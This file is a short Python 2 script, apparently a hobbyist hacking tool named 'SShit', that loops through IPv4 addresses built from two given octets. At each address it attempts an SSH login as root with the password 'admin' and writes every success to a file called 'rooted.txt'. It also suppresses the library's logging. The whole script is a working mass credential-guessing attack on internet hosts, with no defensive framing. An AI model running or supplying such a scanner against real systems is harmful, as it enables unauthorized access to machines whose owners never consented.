#!/usr/bin/env python

######################################################
#Usage python scan.py <1st Ip Number> <2nd Ip Number>#
# $./sshit.py 98 112
# Exit With CTRL-C
######################################################
import optparse
import socket
from multiprocessing import Process
import time
import sys
import warnings
warnings.simplefilter(action="ignore", category=FutureWarning)
try:
 import paramiko
except ImportError:
	print('[!] You do not have paramiko installed!\n')
	sys.exit(1)

uname = 'root'
pwd = 'admin'

print ("SShit SSH scanner hacked together by w0osh`");
raw_input("Press <ENTER> to being scans..\n\n ")

def f(ip):
    try:
	#displaying screen output -_- fairly fast.
        print "Current IP [", ip, "]"
        ssh.connect(ip, username=uname,password=pwd, timeout=1)
    except Exception:
        g = 88
    else:
        file_h = open('rooted.txt','a')
        file_h.write(ip + "\n")
        file_h.close()

    ssh.close()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
paramiko.util.log_to_file("/dev/null") # Shhhh paramiko, it's okay... ;)

def main():
    for nn in range(0,255):
        for oo in range(0,255):
            for pp in range(0,255):
                for kk in range(0,255):
                   ip = sys.argv[1] + "." + sys.argv[2] + ".%d.%d" % (pp,kk)
                   p = Process(target=f, args=(ip,))
                   p.start()
                   p.join()

def bye():
    print "[!] ACK => BYE! :)"

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        bye()
